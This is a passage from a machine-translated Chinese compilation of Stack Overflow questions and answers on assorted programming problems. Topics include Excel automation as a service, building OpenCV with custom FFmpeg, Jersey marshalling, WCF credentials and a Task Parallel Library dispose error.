*   我知道 Microsoft 不支持服务器端 Excel 自动化，但我已经获得了它的服务，并且对所使用的技术没有选择权。
*   我已配置所有组件服务/DCOM/Microsoft Excel 应用程序安全设置，以便服务帐户拥有所有可能的权限。
*   如果服务帐户是计算机上的本地管理员，则该服务可以正确完成工作。这不是真正的生产选项。
*   如果它尝试打开的文件是本地文件，则该服务可以正确地完成这项工作。不幸的是，我们尝试访问的文件位于远程文件服务器上，在这种情况下它不起作用。
*   上面的代码在远程文件上使用同一用户从命令行运行正常，但在作为服务运行时就不行了。
*   我已阅读有关*C:\Windows\System32\config\systemprofile\Desktop*错误的信息，但该文件夹存在。
*   使用服务帐户启动时，Excel 可以正确打开。

所以基本上，情况是 Workbooks.Open 方法在作为服务运行时、在非管理员的服务帐户下以及访问远程文件时挂起。

我将不胜感激有关此主题的任何意见或想法。

谢谢。

乔纳森

编辑：根据下面马特的解决方法，我们已经实现了远程文件的本地副本，所以我接受它作为答案，但我仍然对如何使其直接在远程文件上工作的任何建议感兴趣。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-09-26T12:47:49.023

疯狂与否，你需要创建以下文件夹

C:\Windows\System32\config\systemprofile\Desktop（32 位） C:\Windows\SysWOW64\config\systemprofile\Desktop（64 位）

与使用系统帐户通过调度程序运行的 Excel 有关....

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-18T20:54:57.697

我会将此作为评论，但我还没有足够的代表，所以这只是一个可能的解决方法，而不是一个完整的答案......

> 如果它尝试打开的文件是本地文件，则该服务可以正确地完成这项工作。不幸的是，我们尝试访问的文件位于远程文件服务器上，在这种情况下它不起作用。

您可以先将文件从远程服务器复制到本地临时位置吗？

```
 this._exApp = new Microsoft.Office.Interop.Excel.ApplicationClass();
        this._exApp.Visible = false;

        string localFile = "local.xls";
        System.IO.File.Copy(thisFileName, localFile);

        Log.Logger.Info("Opening workbook...");
        Workbook workbook = this._exApp.Workbooks.Open(localFile, ...);
        Log.Logger.Info("Workbook opened!"); 
```

# python - 使用 Pyside 开发 Qt UI 的任何指南？

> ID：12427922
> 
> 赞同：2
> 
> 时间：2012-09-14T15:50:46.233
> 
> 标签：python, qt, pyside

我是Qt 和 Pyside 的新手，对许多令人眼花缭乱的概念和工具感到困惑**。**

**而不是使用提供的IDE，我更喜欢vim。**

所以我想知道通用指南是什么。也就是说，什么是QML、Qt Creator、Qt Designer？我需要使用所有这些吗？什么是正常的工作流程？

最后，在 python 中关于 Qt 的教程很少，所以我可以调用 Qt C++ 文档寻求帮助（C++ Qt 编程和 Python 之间有什么大的区别）吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-16T04:53:22.243

离开上一份工作后，我写了一些基于 PyQt 的教程，它们也可以应用到 PySide，并且也有一些有用的提示：http: [//bitesofcode.blogspot.com/](http://bitesofcode.blogspot.com/)

我同意你不需要 QML 或 Qt Creator - 但是使用 Qt Designer 来构建你的界面绝对是我推荐的方式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:58:07.987

我在文本编辑器中制作 GUI，就在 Python 程序中。您不必使用 QML、Qt Creator。只需阅读 Jan Bodnar 的[**PySide 教程**](http://zetcode.com/gui/pysidetutorial/)，然后您就可以通过查看 PySide 或 C++ Qt 文档自行弄清楚其余部分

# maven - 使用 maven-jetty-plugin 的荒谬 ClassCastException

> ID：12427925
> 
> 赞同：1
> 
> 时间：2012-09-14T15:50:57.217
> 
> 标签：maven, servlets, jetty, classcastexception, maven-jetty-plugin

有谁知道可能导致以下情况`ClassCastException: org.eclipse.jetty.server.Request cannot be cast to org.eclipse.jetty.server.Request`

当我尝试时，这发生在`doGet(HttpServletRequest req, ..)`我的内部：`HttpServlet``Request baseRequest = (Request) req;`

```
<plugin>
    <groupId>org.mortbay.jetty</groupId>
    <artifactId>jetty-maven-plugin</artifactId>
    <version>8.1.5.v20120716</version>
    <configuration>
        <jettyXml>src/main/webapp/WEB-INF/jetty.xml</jettyXml>
        <connectors>
            <connector implementation="org.eclipse.jetty.server.nio.SelectChannelConnector">
                <port>8081</port>
            </connector>
        </connectors>
            <stopPort>18080</stopPort>
            <stopKey>STOP</stopKey>
        </configuration>
        <dependencies>
            <dependency>
                <groupId>mysql</groupId>
                <artifactId>mysql-connector-java</artifactId>
                <version>5.1.13</version>
            </dependency>
        </dependencies>
</plugin> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T12:04:04.743

您需要确保 jetty-server 未打包为实际应用程序的一部分；这通常通过将范围设置为提供来完成：

```
<dependency>
    <groupId>org.eclipse.jetty</groupId>
    <artifactId>jetty-server</artifactId>
    <version>${jetty.version}</version>
    <scope>provided</scope>
</dependency> 
```

# linux - 配置和构建 OpenCV 以自定义 FFMPEG 安装

> ID：12427928
> 
> 赞同：14
> 
> 时间：2012-09-14T15:51:04.653
> 
> 标签：linux, opencv, linker, ffmpeg, shared-libraries

我似乎无法将 OpenCV 配置为链接到一组非/usr/lib`FFMPEG`库。

我的 LD_LIBRARY_PATH 包含指向自定义安装 FFMPEG 的文件夹的直接链接：

`LD_LIBRARY_PATH=/pathto/ffmpeg-0.10.2/lib`

此外，我将 pkgconfig 配置为：

`PKG_CONFIG_PATH=/samepathto/ffmpeg-0.10.2/lib/pkgconfig/`

但是，在 CMake 中，我找不到任何通往 FFMPEG 的路径设置 - 无论是基本的还是自定义的。与 FFMPEG 相关的唯一设置似乎是`WITH_FFMPEG`类型设置（设置为 ON）。

我可以构建 OpenCV，但它似乎链接到 libavcodec 的系统库 - 这会导致冲突，因为系统库的版本是 0.52，而我安装的版本`FFMPEG`是 0.53。因此，在没有相同系统库的机器上链接应用程序似乎不会链接到我自定义安装的 OpenCV（特别是 libavcodec）（我将这些库安装在共享网络文件夹上）。

我不确定我的问题是与构建和链接到错误版本的 FFMPEG 还是在构建后与我的环境有关（然后链接到错误的 ffmpeg）。

我正在 Linux、Redhat 6、OpenCV 2.3.1 上构建。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-09-14T20:56:16.510

就像是

```
export LD_LIBRARY_PATH=/ffmpeg_install_path/lib/
export PKG_CONFIG_PATH=$PKG_CONFIG_PATH:/ffmpeg_install_path/lib/pkgconfig
export PKG_CONFIG_LIBDIR=$PKG_CONFIG_LIBDIR:/ffmpeg_install_path/lib/ 
```

应该管用。至少它适用于我的 Ubuntu 上的 OpenCV 2.4.x。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2017-04-04T01:40:47.633

对于 OpenCV 3.x 和 ffmpeg 3.x，我必须应用以下补丁

```
diff --git a/cmake/OpenCVFindLibsVideo.cmake b/cmake/OpenCVFindLibsVideo.cmake
index 13b62ac..bab9df3 100644
--- a/cmake/OpenCVFindLibsVideo.cmake
+++ b/cmake/OpenCVFindLibsVideo.cmake
@@ -228,6 +228,12 @@ if(WITH_FFMPEG)
     if(FFMPEG_libavresample_FOUND)
       ocv_append_build_options(FFMPEG FFMPEG_libavresample)
     endif()
+   CHECK_MODULE(libavcodec HAVE_FFMPEG)
+   CHECK_MODULE(libavformat HAVE_FFMPEG)
+   CHECK_MODULE(libavutil HAVE_FFMPEG)
+   CHECK_MODULE(libswscale HAVE_FFMPEG)
+   CHECK_MODULE(libswresample HAVE_FFMPEG)
+   CHECK_MODULE(libavresample HAVE_FFMPEG)
     if(HAVE_FFMPEG)
       try_compile(__VALID_FFMPEG
           "${OpenCV_BINARY_DIR}" 
```

并使用以下脚本构建

```
#!/bin/bash

export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$HOME/Applications/ffmpeg/lib
export PKG_CONFIG_PATH=$PKG_CONFIG_PATH:$HOME/Applications/ffmpeg/lib/pkgconfig
export PKG_CONFIG_LIBDIR=$PKG_CONFIG_LIBDIR:$HOME/Applications/ffmpeg/lib

cmake \
    -D BUILD_EXAMPLES=ON \
    -D BUILD_TESTS=OFF \
    -D OPENCV_EXTRA_EXE_LINKER_FLAGS="-Wl,-rpath,$HOME/Applications/ffmpeg/lib" \
    -D CMAKE_BUILD_TYPE=RELEASE \
    -D CMAKE_INSTALL_PREFIX=$HOME/Applications/opencv \
    /path/to/opencv 
```

另外，在构建 ffmpeg 时，我必须启用 flags `--enable-avresample`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2019-08-27T03:12:11.797

问这个问题已经有好几年了，但我最近遇到了这个问题中描述的各种问题！我想添加我的输入。

首先：我只构建了静态 ffmpeg 库（出于某种原因），opencv 构建过程对此有些敌意。opencv 开发人员有帖子说他们不支持针对静态 ffmpeg 库的 opencv 构建，但我的想法是“如果您也在构建静态 opencv 库怎么办？当然应该支持？”

答案是*肯定*的，你可以针对静态 ffmpeg 库编译静态 opencv 库！我用opencv 4.1.1对ffmpeg 4.2做到了这一点。我不得不使用以下 cmake 选项：

```
cmake3 \
-D BUILD_opencv_apps=OFF \
-D BUILD_opencv_python2=OFF \
-D BUILD_SHARED_LIBS=OFF \
-D WITH_FFMPEG=ON \
-D OPENCV_FFMPEG_SKIP_BUILD_CHECK=ON \ 
```

这些选项会产生一组 opencv 静态库，其中包括您还构建的任何 ffmpeg 静态库，假设您的 PKG_CONFIG_PATH 设置为正确找到这些库（或者如果您已将它们安装到某个默认系统位置）。

**问/答：**

*   **为什么我们不能构建应用程序？**
    *   opencv 构建过程假定您正在构建和链接共享库，即使您只构建静态库。这似乎是构建过程中的一个缺点，而不是技术限制；也许有一天这会得到解决。
*   **什么是 OPENCV_FFMPEG_SKIP_BUILD_CHECK 标志？**
    *   在 ffmpeg 的 cmake 过程中有一个步骤，其中使用与 opencv 的其他应用程序相同的错误构建过程来构建和链接应用程序。从某种意义上说，该过程假定您在不需要时链接到共享库，这是错误的；您可以自己执行相同的构建步骤，而*无需*做出该假设并创建一个工作应用程序。因此，需要关闭此构建检查，以便 opencv 接受是的，事实上，它找到的任何静态库都可以使用。这是
*   **为什么要禁用 python 支持？**
    *   opencv python 构建过程显式地生成一个可由 Python 加载的共享库。
*   **这是否意味着即使使用静态库您仍在构建测试套件？**
    *   是的。但我还没有尝试运行它们

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-02-28T00:34:54.227

除了安德烈的回答：

我发现（对于我的配置）opencv 4.1.1 构建系统没有正确添加 ffmpeg 库路径（尽管它确实设置了包含目录。）我的解决方法是为这些路径提供以下 cmake 构建参数：

```
-DCMAKE_SHARED_LINKER_FLAGS=" -Wl,-rpath-link $FFMPEG_LIBDIR -L$FFMPEG_LIBDIR"
-DCMAKE_MODULE_LINKER_FLAGS=" -Wl,-rpath-link $FFMPEG_LIBDIR -L$FFMPEG_LIBDIR"
-DCMAKE_EXE_LINKER_FLAGS=" -Wl,-rpath-link $FFMPEG_LIBDIR -L$FFMPEG_LIBDIR" 
```

其中 $FFMPEG_LIBDIR 是 ffmpeg 库二进制文件的路径。有必要使用 -rpath-link 选项，因为构建系统没有为我的 ffmpeg 安装提供所有必要的 ffmpeg 库参数。

检查 modules/videoio/cmake/detect_ffmpeg.cmake，看起来 FFMPEG 也可以通过指定来强制接受用户提供的库路径：

```
-DHAVE_FFMPEG=ON
-DFFMPEG_INCLUDE_DIRS=(path to your ffmpeg include directories)
-DFFMPEG_LIBRARIES=(list of ffmpeg libraries, e.g. -lavcodec) 
```

但是如果我们执行这个方法，构建系统会向 FFMPEG 显示“YES”，但对各个模块显示“NO”（没有进一步调试。）

一些用户会发现他们可能需要在链接器标志中提供 --sysroot 链接器参数，或者指定 -DCMAKE_SYSROOT 作为构建参数

希望这可以帮助某人:)

# c# - jQuery DataTable JSON 解析错误

> ID：12427937
> 
> 赞同：0
> 
> 时间：2012-09-14T15:51:42.520
> 
> 标签：c#, jquery, asp.net-mvc-2

好的，所以，我今天的问题是我试图从 AJAX 结果中返回一个 jquery 数据表，每次我请求 AJAX 时，我都会收到以下错误：

“DataTables 警告：无法解析来自服务器的 JSON 数据。这是由 JSON 格式错误引起的”

这是我的看法：

```
<script type="text/javascript">
        $(document).ready(function () {

            var oTable = $('#StudentTable').dataTable({
                "bServerSide": true,
                "sAjaxSource": "Admin/FindStudent",
                "bProcessing": true,
                "aoColumns": [
                    { "sName": "StudentID",
                        "bSearchable": false,
                        "bSortable": false,
                        "fnRender": function (oObj) {
                            return '<a href=\"Student/Details/' + oObj.aData[0] + '\">View</a>';
                        }
                    },
                    { "sName": "FirstName" },
                    { "sName": "LastName" },
                    { "sName": "EmailAddress" }
                ]
            });
        });
    </script>
<table id="StudentTable" class="display">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>First Name</th>
                        <th>Last Name</th>
                        <th>Email Address</th>
                    </tr>
                </thead>
                <tbody> 
                </tbody>
            </table> 
```

这是控制器：

```
public ActionResult FindStudent(DataTableParamModel dtParams)
    {

        //if (Session["IsAdmin"] != "True")
        //{
        //    return View("Login");
        //}

        var repo = new StudentRepository();
        var allStudents = repo.GetAllStudents();
        IEnumerable<StudentInfo> filteredStudents;
        //Check whether the students should be filtered by keyword
        if (!string.IsNullOrEmpty(dtParams.sSearch))
        {
            //Used if particulare columns are filtered 
            var fnameFilter = Convert.ToString(Request["sSearch_1"]);
            var lnameFilter = Convert.ToString(Request["sSearch_2"]);
            var emailFilter = Convert.ToString(Request["sSearch_3"]);

            //Optionally check whether the columns are searchable at all 
            var isFNameSearchable = Convert.ToBoolean(Request["bSearchable_1"]);
            var isLNameSearchable = Convert.ToBoolean(Request["bSearchable_2"]);
            var isEmailSearchable = Convert.ToBoolean(Request["bSearchable_3"]);

            filteredStudents = repo.GetAllStudents()
               .Where(c => isFNameSearchable && c.FirstName.ToLower().Contains(dtParams.sSearch.ToLower())
                           ||
                           isLNameSearchable && c.LastName.ToLower().Contains(dtParams.sSearch.ToLower())
                           ||
                           isEmailSearchable && c.EmailAddress.ToLower().Contains(dtParams.sSearch.ToLower()));
        }
        else
        {
            filteredStudents = allStudents;
        }

        var isFNameSortable = Convert.ToBoolean(Request["bSortable_1"]);
        var isLNameSortable = Convert.ToBoolean(Request["bSortable_2"]);
        var sortColumnIndex = Convert.ToInt32(Request["iSortCol_0"]);
        Func<StudentInfo, string> orderingFunction = (c => sortColumnIndex == 1 && isFNameSortable ? c.FirstName :
                                                       sortColumnIndex == 2 && isLNameSortable ? c.LastName :
                                                       "");

        var sortDirection = Request["sSortDir_0"]; // asc or desc
        if (sortDirection == "asc")
            filteredStudents = filteredStudents.OrderBy(orderingFunction);
        else
            filteredStudents = filteredStudents.OrderByDescending(orderingFunction);

        var displayedStudents = filteredStudents.Skip(dtParams.iDisplayStart).Take(dtParams.iDisplayLength);
        var result = from c in displayedStudents select new[] { Convert.ToString(c.StudentID), c.FirstName, c.LastName, c.EmailAddress };
        JsonResult results = Json(new
                        {
                            sEcho = dtParams.sEcho,
                            iTotalRecords = allStudents.Count(),
                            iTotalDisplayRecords = filteredStudents.Count(),
                            aaData = result
                        },
                    JsonRequestBehavior.AllowGet);
        return View(results);
    } 
```

使用 JSONLint 时，它会吐出

```
Parse error on line 1:
<headid="Head1"><sty
^
Expecting '{', '[' 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T16:17:03.340

尝试返回 Json 对象：

```
return Json(new {
         sEcho = dtParams.sEcho,
         iTotalRecords = allStudents.Count(),
         iTotalDisplayRecords = filteredStudents.Count(),
         aaData = result
   }, JsonRequestBehavior.AllowGet); 
```

[资源](http://www.codeproject.com/Articles/155422/jQuery-DataTables-and-ASP-NET-MVC-Integration-Part)

# java - 泽西编组成员名单问题

> ID：12427944
> 
> 赞同：4
> 
> 时间：2012-09-14T15:52:02.843
> 
> 标签：java, web-services, rest, jersey

我正在使用 Java Jersey 1.x 来编组一个具有多个成员的对象，其中一个是列表。所有成员变量都被正确编组并以正确的返回类型返回。但是，它不包含`objectList`在返回数据中。

例子：

```
@XmlRootElement
public class ClassWithList {
    private String front;
    private int total;
    private ArrayList<AnotherPOJOObject> objectList;
...
getters/setters 
```

吸气剂：

```
public List<AnotherPOJOObject> getObjectList() {
    return objectList;
} 
```

我对其进行了调试并检查了 objectList 确实填充了数据。 `AnotherPOJOObject`也被注释为`XmlRootElement`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:31:20.893

看看[http://docs.oracle.com/javase/6/docs/api/javax/xml/bind/annotation/XmlAccessorType.html](http://docs.oracle.com/javase/6/docs/api/javax/xml/bind/annotation/XmlAccessorType.html)。它详细说明了 JAXB 将如何尝试序列化 POJO。特别要注意的是，它仅默认为公共成员 - 这意味着“每个公共 getter/setter 对和每个公共字段都将自动绑定到 XML，除非由 XmlTransient 注释”。在这种情况下，我猜测您没有 objectList 的公共 setter 字段，因此 JAXB 不会序列化它。要使列表序列化，您可以：

*   为 objectList 添加公共 setter 方法
*   将 objectList 声明为 public（可能不是一个好主意）
*   向 getter添加`@XmlElement`注释以明确告诉 JAXB 将列表编组为 XML。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-15T06:02:59.737

我遇到了同样的问题，经过反复试验后解决了。

Try giving the annotation `@XmlElementWrapper(name = "orders")` to `getObjectList()` and also make the type to `private List<AnotherPOJOObject> objectList;`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-16T14:44:59.660

Thanks to the suggestion to basiljames, I was able to get closer to the answer. The real issue was that the List of `AnotherPOJOOject` wasn't so plain after all. Each object had an untyped `Map` of it's own, and that threw the Marshaller into a fit, because, it always wants to know the type of an object.

I guess the takeaway from this answer to make sure that every collection you return has a well defined type!

# javascript - Yii页面刷新问题如何解决？

> ID：12427948
> 
> 赞同：0
> 
> 时间：2012-09-14T15:52:19.067
> 
> 标签：javascript, jquery, yii

我有一个页面，我们可以在其中更改我们的个人资料图片，就像在 twitter 中一样。但是当我更改个人资料图片时，图像没有刷新。我使用相同的控制器来更改和呈现页面。我需要按 F5 按钮才能看到图像已更改。

例如：页面正在设置/配置文件，当我们保存图像时，会调用相同的控制器/动作并呈现相同的视图，但图像不会刷新。

我怎样才能让这个东西工作？我已经尝试过 javascript，尝试过重定向似乎没有任何效果。我只能在手动按 F5 按钮时看到它工作。

非常感谢任何建议或解决方案。

谢谢，

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-16T04:58:08.357

这是您可以在视图中使用的示例。

```
echo CHtml::image(Yii::app()->request->baseUrl."/images/profile_pic$user_id.png?_=".time(), 'Profile Pic'); 
```

# apache - 接收到导致减速的我的 apache 服务器的空白/无效命中

> ID：12427950
> 
> 赞同：0
> 
> 时间：2012-09-14T15:52:24.527
> 
> 标签：apache

今天早些时候我注意到我的服务器有些慢，当我查看日志文件时，在合法站点请求之间是这样的空白请求：

> 108.212.75.60 - - [13/Sep/2012:16:56:28 -0400] “-” 408 - “-” “-”
> 
> 108.212.75.60 - - [13/Sep/2012:16:56:28 -0400] “-” 408 - “-” “-”
> 
> 108.212.75.60 - - [13/Sep/2012:16:56:28 -0400] “-” 408 - “-” “-”
> 
> 108.212.75.60 - - [13/Sep/2012:16:56:28 -0400] “-” 408 - “-” “-”

有谁知道这些可能是什么或我如何防止它们？它们似乎占用了我服务器资源的相当一部分。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:45:09.130

408是因为超时，

寻找 MaxClients 和 KeepAliveTimeout ， 24 和 5 很好（按顺序）

如果这是托管服务器，您的管理员应该查找这些。

如果这些请求来自单个 ip 或一堆 ip，并且如果您认为这是故意攻击，您可以通过 .htaccess 禁止它们。

# tfs - Beyond Compare - 比较时如何忽略 TFS 文件的只读标志

> ID：12427954
> 
> 赞同：1
> 
> 时间：2012-09-14T15:52:40.427
> 
> 标签：tfs, readonly, beyondcompare

我正在尝试使用 Beyond Compare 将具有只读标志（由 TFS 引起）的文件与除了只读标志之外应该相同的文件目录进行比较。

是否有一个 Beyond Compare 设置会忽略 readonly 标志。我意识到我可以通过 Windows 手动清除只读标志，但这很耗时/等等。

Beyond Compare 版本 3.2.4（内部版本 13298）TFS 2010

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:07:54.760

只读标志是指 DOS 只读属性（如系统、隐藏、存档）吗？Beyond Compare 已经默认忽略了这些。

使用**Session->Session Settings...**菜单项打开比较首选项对话框。在**比较**选项卡上，确保在**比较文件属性**下未选中**只读**。如果文件的最后修改时间也有差异，您也应该打开**比较内容**复选框。

# forms - 如何在 Google 电子表格中将多项选择文本值更改为数字

> ID：12427956
> 
> 赞同：1
> 
> 时间：2012-09-14T15:52:56.810
> 
> 标签：forms, google-apps-script, google-sheets

我有简单的 Google 表单，其中有一组问题，其答案是`Yes`或`No`。我想根据用户回答的问题（等级：1 到 5）分配预定义的标记/评分。现在所有这些输入都存储在 Google 电子表格中。

关于表格：问题是：

1.  固定分值 4，如果用户回答/选择是
2.  如果回答为“是”，则固定得分值为 3
3.  如果回答为是，则固定得分 1

如果用户选择否，则默认固定值为 0

现在我如何在电子表格响应中获取这些数值而不是 Yes 或 No 值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-15T15:23:17.403

您有 2 个选项来执行此操作： 1\. 您可以使用谷歌应用程序脚本构建自己的表单，请参阅 UiApp。2.用你的电子表格中的问题和使用函数制作一个正常的表格，比如：=IF(a1,yes,4)等

我建议使用自定义表单。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-24T12:50:35.847

我认为这可以帮助你，如果你正在考虑用触发器编写你的谷歌脚本！

```
function doGet() {

var app = UiApp.createApplication().setTitle("formulario");
var panel = app.createVerticalPanel().setId("panel");
var labelAsk = app.createLabel().setId("ask").setText("MY QUESTION IS HERE");
var value = app.createListBox().setId("value");
value.setItemText(0, "Choose");
value.setItemText(1, "1");
value.setItemText(2, "2");
value.setItemText(3, "3");
value.setItemText(4, "4");

var button = app.createButton().addClickHandler(handler).setId("button").setText("send");
var handler = app.createServerHandler("check").addCallbackElement("panel");
button.addClickHandler(handler);

 panel.add(labelAsk);
 panel.add(button);
 app.add(panel);

return app;

};
function check(e){
 try{
var value = e.parameter.value;
 switch(value){
   case "1": change option in cell of spreadsheet;
   case "2": change option in cell of spreadsheet;
   case "3": change option in cell of spreadsheet;
   case "4": change option in cell of spreadsheet;
   default:  change option in cell of spreadsheet;
  }//end if
 }//end try
  catch(e){ error_en_e_parameter_value}
 return app;
}; 
```

# java - Android 单元测试和类成员可见性

> ID：12427959
> 
> 赞同：3
> 
> 时间：2012-09-14T15:53:04.267
> 
> 标签：java, android, unit-testing

已经创建了一个 android 测试项目，目前正在尝试编写 android 单元测试

现在，如果您有一堆要测试其方法的类，并且您做得很好并且应用了最少访问原则并将所有成员变量设为私有，那么您如何编写有效的单元测试？

换句话说，我的单元测试位于我要测试的类之外的类中，因此我无法访问我的断言语句中的任何成员变量

是否有针对这种情况的解决方法，您希望访问所有内容以进行测试

请不要告诉我我必须为每个成员变量编写 getter 和 setter 以便我可以编写一些单元测试

（考虑一下，这更像是一个 Java 问题，而不是一个特定于 android 的问题）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:59:15.787

有趣的问题...尽管您可能必须为每个成员变量编写 getter/setter。将它们放在仅用于测试的子类中可能是值得的，这样您就可以轻松地在生产代码中保留封装。

这是我能想到的最好的解决方案。

编辑：或者您可以制作一个重复的类进行测试，您可以在其中快速将所有“私有”替换为“公共”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T20:37:05.800

如果您真的不想编写 getter 并且想要验证字段变量，您仍然可以通过反射访问类字段变量并对它们进行断言，如下所示：

目标类别：

```
public class TestMe{
    private String value = null;

    public void update(){
        value = "hello";
    }
} 
```

测试：

```
public class TestMeTest {

    @Test
    public void testUpdate() throws NoSuchFieldException, IllegalAccessException {

        TestMe testMe = new TestMe();

        assertNull(getField(testMe, "value"));

        testMe.update();

        assertEquals("hello", getField(testMe, "value"));

    }

    private Object getField(Object root, String name) throws NoSuchFieldException, IllegalAccessException {

        Field field = root.getClass().getDeclaredField(name);
        field.setAccessible(true);

        Object value = field.get(root);

        field.setAccessible(false);

        return value;
    }
} 
```

# wcf - 从 .Net 2.0 使用带有 ClientCredentialType="UserName" 的 WCF 服务

> ID：12427960
> 
> 赞同：0
> 
> 时间：2012-09-14T15:53:11.860
> 
> 标签：wcf, web-services, visual-studio-2005, c#-2.0, web-reference

我正在帮助某人使用 Visual Studio Tools For Applications 将 Infopath 应用程序连接到使用 WCF 编写的服务，该服务需要在 SOAP 标头 (clientCredentialType="UserName") 中发送用户名和密码。该服务正在使用 basicHttpBinding。

Infopath 2010 依赖于 Visual Studio Tools For Applications 2005，因此我不得不添加“Web 引用”而不是“服务引用”。我以前从来没有这样做过，试图弄清楚如何做到这一点变得非常有问题。

在服务参考中，我只是说：

```
service.Credentials.UserName.UserName = "username";
service.Credentials.UserName.Password = "password"; 
```

但是，当使用 Web 引用时，Credentials 属性的行为会有所不同，我无法让它自动在 SOAP 标头中传递用户名和密码。

我尝试了一些事情，包括这些没有运气：

```
MyService service = new MyService();
CredentialCache cache = new CredentialCache();
// I've tried "Basic" and string.Empty as well in the place of "UserName"
cache.Add(new Uri(service.Url), "UserName", new NetworkCredential("username", "password"));
service.Credentials = cache;
service.PreAuthenticate = true;

service.MyMethod(); 
```

和

```
MyService service = new MyService();

service.Credentials = new NetworkCredential("username", "password");

service.MyMethod(); 
```

但完全没有运气。在服务上记录整个消息，用户名和密码根本不包含在 SOAP 标头中，我收到以下错误：“验证消息安全性时发生错误。”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-11T16:21:25.517

答案实际上只是您不能从 .Net 2.0 自动执行此操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-11T16:26:21.457

WCF 取代 ASMX 是有原因的。对安全标准的支持就是其中之一。

如果您使用的是 VSTA，那么我认为您可以使用 COM 对象。您可以使用 .NET 3.5（它只是 .NET 2.0 SP2 加上一些额外的库）创建一个 COM 对象。此 COM 对象可以使用 WCF 服务引用来使用服务，但只会公开 COM。任何可以使用 COM 对象的代码都可以使用您的“代理对象”。

# c# - 奇数任务并行库 InvalidOperationException

> ID：12427963
> 
> 赞同：1
> 
> 时间：2012-09-14T15:53:19.613
> 
> 标签：c#, .net, task-parallel-library, dispose

我有以下代码来构建从 SQL Server 中提取的高级数据结构，然后当该数据的检索完成时，我会更新 UI。使用的代码是

```
private void BuildSelectedTreeViewSectionAsync(TreeNode selectedNode)
{
    // Initialise.
    SqlServer instance = null;
    SqlServer.Database database = null;

    // Build and expand the TreeNode.
    Task task = null;
    task = Task.Factory.StartNew(() => {
        string[] tmpStrArr = selectedNode.Text.Split(' ');

        string strDatabaseName = tmpStrArr[0];

        instance = SqlServer.Instance(this.conn);

        database = instance.GetDatabaseFromName(strDatabaseName);
    }).ContinueWith(cont => {
        instance.BuildTreeViewForSelectedDatabase(this.customTreeViewSql,
            selectedNode, database);

        selectedNode.Expand();

        task.Dispose();
    }, CancellationToken.None, TaskContinuationOptions.OnlyOnRanToCompletion,
        this.MainUiScheduler);
} 
```

这在我的主要开发机器上可以正常工作；也就是说，它完成了`database`对象的构建，然后在继续更新 UI 并处置`task`（任务对象）。

但是，我一直在另一台机器上进行一些测试，我得到了一个`InvalidOperationException`，这是由于`task.Dispose()`在`task`which 上仍然处于状态，但是除非任务已经完成，否则不会触发`Running`延续。`cont`

抛出异常时，调试器中的代码如下所示：

![在此处输入图像描述](../Images/81032b3ab73655572cbb5d800819340f.png)

[我知道调用`Dispose`任务](http://blogs.msdn.com/b/pfxteam/archive/2012/03/25/10287435.aspx)几乎总是不必要的。这个问题更多地是关于为什么继续在这里触发？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T16:32:13.467

原因很简单，您调用[`Dispose`](http://msdn.microsoft.com/en-us/library/system.idisposable.dispose.aspx)的是延续本身而*不是*第一个任务

您的代码包括：

```
Task task = null;
var task = <task 1>.ContinueWith(t => { 
    /* task 2 */ 

    task.Dispose();
}); 
```

在上面的代码中，`task`等于延续（[`ContinueWith`](http://msdn.microsoft.com/en-us/library/dd270696.aspx)不传回原来的[`Task`](http://msdn.microsoft.com/en-us/library/system.threading.tasks.task.aspx)，它传递延续），这就是你传递给的闭包中捕获的内容`ContinueWith`。

`Task`您可以通过将传递给`ContinueWith`方法的参数的引用与以下内容进行比较来测试这一点`task`：

```
Task task = null;
var task = <task 1>.ContinueWith(t => { 
    /* task 2 */ 
    if (object.ReferenceEquals(t, task))
        throw new InvalidOperationException("Trying to dispose of myself!");

    task.Dispose();
}); 
```

为了处理第一个，您需要将其分解为两个`Task`变量并捕获第一个`Task`，如下所示：

```
var task1 = <task 1>;
var task2 = task1.ContinueWith(t => {
    // Dispose of task1 when done.
    using (task1)
    {
        // Do task 2.
    }
}); 
```

但是，由于在方法`previous Task`中作为参数传递给您`ContinueWith`，您根本不需要`task`在闭包中捕获，您可以简单地调用作为参数传递给您的参数`Dispose`：`Task`

```
var task = <task 1>.ContinueWith(t => {
    // t    = task 1
    // task = task 2
    // Dispose of task 1 when done.
    using (t)
    {
         // Do task 2.
    }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T16:30:20.187

我很确定您在上面尝试做的事情等同于：

```
task = Task.Factory.StartNew(() => ...);
task.ContinueWith(cont => { ... task.Dispose(); }); 
```

但是，使用您的代码分配给任务变量的是 ContinueWith 工作项，而不是原始的 StartNew 工作项。

更重要的是，在这种情况下，您甚至可能不需要担心 task.Dispose()。

唯一一次执行 task.Dispose() 有任何实际价值是当某处涉及 task.Wait() 时，它会在后台分配 OS 等待句柄资源。

